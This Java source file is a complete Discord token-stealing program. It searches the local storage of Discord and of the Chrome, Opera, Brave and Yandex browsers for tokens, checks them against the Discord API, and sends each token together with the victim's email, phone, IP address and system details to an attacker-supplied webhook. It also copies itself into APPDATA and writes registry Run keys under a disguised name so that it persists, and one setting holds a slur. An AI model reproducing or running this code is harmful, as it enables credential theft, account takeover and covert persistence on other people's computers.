package me.xefer;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    private static boolean debug;
    private static boolean shouldPersist;
    public static void main(String[] args) throws Exception {
        // TODO: Send normal text (not embed)
        // TODO: Billing information
        // TODO: Check for nitro

        //Settings:
        String discord_avatar_url = "https://i.ibb.co/fps45hd/steampfp.jpg";
        String discord_username = "Faggit";
        String discord_webhook_url = args[0]; //Change this
        boolean send_embed = true; //Do not change this (yet)
        boolean ensure_valid = true;
        debug = false;
        shouldPersist = true;

        //Mini
        if (shouldPersist) {
            mini_persistence();
        }


        //Gatherer
        if (send_embed) {
            for (String token : getTokens(ensure_valid)) {
                sendEmbed(grabTokenInformation(discord_avatar_url, discord_username, token, send_embed), discord_webhook_url);
            }
        } else {
            //sendText(grabTokenInformation(token));
        }
    }

    private static String grabTokenInformation(String avatar_url, String username, String token, boolean sendEmbed) throws IOException {
        //Account Information
        String accountInfo_username;

        String accountInfo_email;
        String accountInfo_phoneNr;
        boolean accountInfo_hasNitro; //https://discord.com/api/v8/users/@me/billing/subscriptions
        String accountInfo_billingInfo; //https://discord.com/api/v8/users/@me/billing/payment-sources
        String accountInfo_imageURL;

        //PC Info
        String pcInfo_IP;
        String pcInfo_Username;
        String pcInfo_cpuArch;
        String pcInfo_WindowsVersion;

        long colour;

        //Assign what we know
        pcInfo_Username = System.getProperty("user.name");
        pcInfo_WindowsVersion = System.getProperty("os.name");
        pcInfo_cpuArch = System.getProperty("os.arch");

        //Get discord token
        JSONObject tokenInformation = new JSONObject(get_request("https://discordapp.com/api/v6/users/@me", true, token));
        accountInfo_username = tokenInformation.getString("username") + "#" + tokenInformation.getString("discriminator");
        accountInfo_email = tokenInformation.getString("email");
        accountInfo_phoneNr = String.valueOf(tokenInformation.get("phone"));
        accountInfo_imageURL = "https://cdn.discordapp.com/avatars/"+tokenInformation.getString("id")+"/"+tokenInformation.getString("avatar")+".png";
        colour = 9109759;


        //Get IP
        pcInfo_IP = get_request("http://ipinfo.io/ip", false, null);

        JSONObject webhook_content = new JSONObject();
        JSONArray embed_content = new JSONArray();
        JSONObject embedObject = new JSONObject();
        JSONObject footerObject = new JSONObject();
        JSONArray fieldObjects = new JSONArray();
        JSONObject firstField = new JSONObject();
        JSONObject secondField = new JSONObject();
        JSONObject tokenField = new JSONObject();

        webhook_content.put("username", username);
        webhook_content.put("avatar_url", avatar_url);
        embedObject.put("color", colour);
        footerObject.put("icon_url", "https://i.ibb.co/fps45hd/steampfp.jpg");
        footerObject.put("text", "November | " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis()));
        embedObject.put("footer", footerObject);
        embedObject.put("thumbnail", new JSONObject().put("url", accountInfo_imageURL));
        embedObject.put("author", new JSONObject().put("name", accountInfo_username));
        firstField.put("name", "Account Info");
        firstField.put("value", "Email: "+accountInfo_email+"\nPhone: "+accountInfo_phoneNr+"\nNitro: Coming Soon\nBilling Info: Coming Soon");
        firstField.put("inline", true);
        secondField.put("name", "PC Info");
        secondField.put("value", "IP: "+pcInfo_IP+"\nUsername: "+pcInfo_Username+"\nWindows version: "+pcInfo_WindowsVersion+"\nCPU Arch: "+pcInfo_cpuArch);
        secondField.put("inline", true);
        tokenField.put("name", "**Token**");
        tokenField.put("value", "```"+token+"```");

        fieldObjects.put(firstField);
        fieldObjects.put(secondField);
        fieldObjects.put(tokenField);

        embedObject.put("fields", fieldObjects);

        embed_content.put(embedObject);

        webhook_content.put("embeds", embed_content);
        if (debug) {
            System.out.println(webhook_content.toString());
        }

        return webhook_content.toString(4);
    }



    private static List<String> getTokens(boolean check_isValid) throws IOException {
        List<String> tokens = new ArrayList<>();
        String localappdata = System.getenv("LOCALAPPDATA");
        String roaming = System.getenv("APPDATA");
        String[][] paths = {
                {"Discord", roaming + "\\Discord\\Local Storage\\leveldb"}, //Standard Discord
                {"Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb"}, //Discord Canary
                {"Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb"}, //Discord PTB
                {"Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"}, //Chrome Browser
                {"Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"}, //Opera Browser
                {"Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}, //Brave Browser
                {"Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"} //Yandex Browser
        };

        for (String[] path : paths) {
            try {
                File file = new File(path[1]);

                for (String pathname : file.list()) {
                    if (debug) {
                        System.out.println("Searching: " + path[1] +System.getProperty("file.separator")+ pathname);
                    }
                    FileInputStream fstream = new FileInputStream(path[1] + System.getProperty("file.separator") + pathname);
                    DataInputStream in = new DataInputStream(fstream);
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String strLine;
                    while ((strLine = br.readLine()) != null) {
                        Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}");
                        Matcher m = p.matcher(strLine);

                        while (m.find()) {
                            if (debug) {
                                System.out.println("Found token: " + m.group() + " in " + pathname);
                                System.out.println("isDuplicate: " + tokens.contains(m.group()));
                            }
                            if (!tokens.contains(m.group())) {
                                tokens.add(m.group());
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }

        if (check_isValid) {
            if (debug) {
                System.out.println("checking if valid");
                System.out.println(tokens.toString());
            }
            if (!tokens.isEmpty()) {
                Iterator<String> iter = tokens.iterator();

                while (iter.hasNext()) {
                    String str = iter.next();
                    try {
                        get_request("https://discordapp.com/api/v6/users/@me", true, str);
                        if (debug) {
                            System.out.println("Token: " + str + " is valid");
                        }

                    } catch (IOException e) {
                        if (debug) {
                            System.out.println("Removing token " + str + "            " + e.getMessage());
                        }
                        iter.remove();
                    }
                }

                return tokens;
            } else {
                if (debug) {
                    System.out.println("No tokens found\nExitting...");
                    System.exit(0);
                }
                return null;
            }


        } else {
            return tokens;
        }
    }



     /////////////////
    /// Requests ///
   ////////////////

    private static String get_request(String uri, boolean isChecking, String token) throws IOException {
        URL url = new URL(uri);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
        if (isChecking) {
            connection.setRequestProperty("Authorization", token);
        }
        connection.setRequestMethod("GET");
        InputStream responseStream = connection.getInputStream();
        if (debug) {
            System.out.println("GET - "+connection.getResponseCode());
        }
        try (Scanner scanner = new Scanner(responseStream)) {
            String responseBody = scanner.useDelimiter("\\A").next();
            if (debug) {
                System.out.println(responseBody);
            }
            return responseBody;
        } catch (Exception e) {
            return "ERROR";
        }
    }

    private static void sendEmbed(String jsonContent, String webhookURL) throws IOException {
        URL url = new URL(webhookURL);
        URLConnection con = url.openConnection();
        HttpURLConnection connection = (HttpURLConnection)con;
        connection.setRequestMethod("POST"); // PUT is another valid option
        connection.setDoOutput(true);

        byte[] out = jsonContent.getBytes(StandardCharsets.UTF_8);
        int length = out.length;

        connection.setFixedLengthStreamingMode(length);
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
        connection.connect();
        try(OutputStream os = connection.getOutputStream()) {
            os.write(out);
        }
        if (debug) {
            System.out.println("POST - "+connection.getResponseCode());
        }

    }

    private static void mini_persistence() throws Exception {
        String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        String decodedPath = URLDecoder.decode(path, "UTF-8");
        String file_name = decodedPath.split("/")[decodedPath.split("/").length - 1];
        String new_name = UUID.randomUUID().toString().substring(16) + ".jar";

        if (file_name.contains(".jar")) {
            //Make sure there is a file in roaming that does what we do
            InputStream is = null;
            OutputStream os = null;
            try {
                is = new FileInputStream(new File(System.getProperty("user.dir"), file_name));
                os = new FileOutputStream(new File(System.getenv("APPDATA"), new_name));
                byte[] buffer = new byte[1024];
                int length;
                while ((length = is.read(buffer)) > 0) {
                    os.write(buffer, 0, length);
                    if (debug) {
                        System.out.println("Moving " + length + "bytes");
                    }

                }
            } finally {
                if(is!=null&&os!=null){
                    is.close();
                    os.close();
                }

            }
            if (new File(System.getenv("APPDATA"), new_name).exists()) {
                //Copy file to startup
                String[] reg_start = {
                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v JNAUtils /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v JNAUtils /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v JNAUtils /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v JNAUtils /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\""
                };

                for (String command : reg_start) {
                    if (debug) {
                        System.out.println("Adding reg key: " + command);
                    }
                    Process pr = Runtime.getRuntime().exec(command);
                    pr.destroy();
                }
            }


        }


    }
}
